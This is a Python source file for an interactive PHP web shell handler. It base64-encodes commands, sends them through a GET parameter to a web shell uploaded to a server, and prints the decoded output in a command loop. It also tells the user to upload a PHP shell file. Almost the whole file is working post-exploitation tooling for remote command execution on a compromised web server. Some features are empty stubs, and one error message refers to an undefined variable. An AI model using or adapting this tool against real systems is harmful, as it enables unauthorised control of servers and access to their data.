import web_utils
import sys
from base64 import b64encode, b64decode
import binascii

class PHP_Shell_Handler:
    def __init__(self, webshell_url, webshell_get_param="phpshellcmd", encoded=True):
        try:
            web_utils.validate_url(webshell_url)
        except web_utils.InvalidUrlError:
            print(f"[-] - The provided url: '{url} does not seem to be a valid url'")
            sys.exit(0)

        if not web_utils.connection_check(webshell_url):
            sys.exit(1)

        self.webshell_url = webshell_url
        self.webshell_get_param = webshell_get_param
        self.encoded = encoded
    
    def _encode_cmd(self, cmd):
        encoded_cmd = b64encode(cmd.encode()).decode()
        return encoded_cmd

    def _decode_result(self, result):
        try:
            decoded_result = b64decode(result.encode()).decode()
        except binascii.Error:
            return f"[-] - Result was not valid base64 and therefore could not be decoded...\nRESULT:\n{result}"
        
        return decoded_result

    def _send_cmd(self, cmd):
        if self.encoded:
            cmd = self._encode_cmd(cmd)

        request_url = self.webshell_url + "?" + self.webshell_get_param + "=" + cmd

        result = web_utils.make_request(request_url)

        return result.text

    def upload_file_to_server(self, file_contents):
        pass

    def download_file_from_server(self, filepath):
        pass

    def switch_shell(self):
        pass 

    def catch_shell(self):
        pass

    def shell(self):
        shell_filename = "shell.php"
        if self.encoded:
           shell_filename = "encoded_shell.php" 

        with open(shell_filename, "r") as f:
            print("[!] - Upload a shell with this php inside to use this shell handler - [!]:\n\n")
            print(f.read() + "\n")

        shell_banner = self.webshell_url.split("/")[-1].split('.')[0] + "@" + self.webshell_url.split("/")[-2]
        

        while True:
            cmd = input(f"[ {shell_banner} ] > ")
            if not cmd:
                continue

            result = self._send_cmd(cmd)

            if self.encoded:
                print(self._decode_result(result))
            else:
                print(result)



handler = PHP_Shell_Handler("http://127.0.0.1:9001/encoded_shell.php", encoded=True)
handler.shell()

        

